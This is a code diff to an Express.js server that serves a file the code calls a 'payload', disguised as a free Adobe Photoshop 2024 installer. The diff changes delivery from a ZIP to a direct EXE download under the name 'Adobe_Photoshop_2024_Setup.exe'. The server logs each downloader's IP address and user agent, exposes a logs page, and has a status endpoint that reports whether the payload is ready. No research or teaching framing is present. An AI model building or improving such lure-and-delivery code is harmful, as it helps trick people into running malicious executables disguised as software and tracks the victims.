@@ -33,27 +33,31 @@ app.get('/', (req, res) => {
     res.render('index', { host: req.get('host') });
 });
 
-// Serve the payload.zip
+// Serve the EXE file directly (no ZIP)
 app.get('/download', (req, res) => {
-    const zipPath = path.join(__dirname, 'Photoshop_Setup.exe');
+    const exePath = path.join(__dirname, 'payload', 'Photoshop_Setup.exe');
     const ip = req.ip || req.connection.remoteAddress;
     const ua = req.headers['user-agent'] || 'unknown';
     
     appendLog(`DOWNLOAD_REQUEST | IP: ${ip} | UA: ${ua}`);
     
-    if (fs.existsSync(zipPath)) {
-        res.download(zipPath, 'Photoshop_CC_2024_Free.zip', err => {
+    if (fs.existsSync(exePath)) {
+        // Set headers for EXE download
+        res.setHeader('Content-Type', 'application/octet-stream');
+        res.setHeader('Content-Disposition', 'attachment; filename="Adobe_Photoshop_2024_Setup.exe"');
+        
+        res.download(exePath, 'Adobe_Photoshop_2024_Setup.exe', err => {
             if (err) {
                 appendLog(`DOWNLOAD_ERROR | ${err.message}`);
             } else {
-                appendLog(`DOWNLOAD_SERVED | IP: ${ip}`);
+                appendLog(`DOWNLOAD_SERVED | IP: ${ip} | File: Adobe_Photoshop_2024_Setup.exe`);
             }
         });
     } else {
-        appendLog(`DOWNLOAD_FAILED | payload.zip not found`);
+        appendLog(`DOWNLOAD_FAILED | Photoshop_Setup.exe not found at ${exePath}`);
         res.status(404).send(`
             <h1>Download Not Available</h1>
-            <p>The file is being prepared. Please try again later.</p>
+            <p>The installer is being prepared. Please try again later.</p>
             <a href="/">Go Back</a>
         `);
     }
@@ -76,9 +80,11 @@ app.get('/logs', (req, res) => {
 
 // API endpoint to check if payload exists
 app.get('/api/status', (req, res) => {
-    const zipPath = path.join(__dirname, 'payload.zip');
+    const exePath = path.join(__dirname, 'payload', 'Photoshop_Setup.exe');
     res.json({
-        payload_ready: fs.existsSync(zipPath),
+        payload_ready: fs.existsSync(exePath),
+        payload_type: 'exe',
+        filename: 'Adobe_Photoshop_2024_Setup.exe',
         server_time: new Date().toISOString()
     });
 });
@@ -93,6 +99,9 @@ app.listen(PORT, () => {
     console.log(`  🌐 Website:  http://localhost:${PORT}`);
     console.log(`  📥 Download: http://localhost:${PORT}/download`);
     console.log(`  📊 Logs:     http://localhost:${PORT}/logs`);
+    console.log(`  📋 Status:   http://localhost:${PORT}/api/status`);
+    console.log('');
+    console.log('  📦 Payload:  payload/Photoshop_Setup.exe');
     console.log('');
     console.log('='.repeat(55));
     console.log('');
